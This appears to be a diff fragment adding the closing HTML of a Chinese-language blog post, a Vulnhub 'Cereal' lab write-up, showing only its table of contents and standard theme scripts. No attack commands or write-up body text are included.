+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. 80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. 44441端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&text=21 Vulnhub Cereal Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&is_video=false&description=21 Vulnhub Cereal Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=21 Vulnhub Cereal Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&name=21 Vulnhub Cereal Writeup&description=&lt;p&gt;该靶机难度我认为很高，比较贴近真实场景，尤其是权限提升的时候，需要一定的耐心和细心。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&t=21 Vulnhub Cereal Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
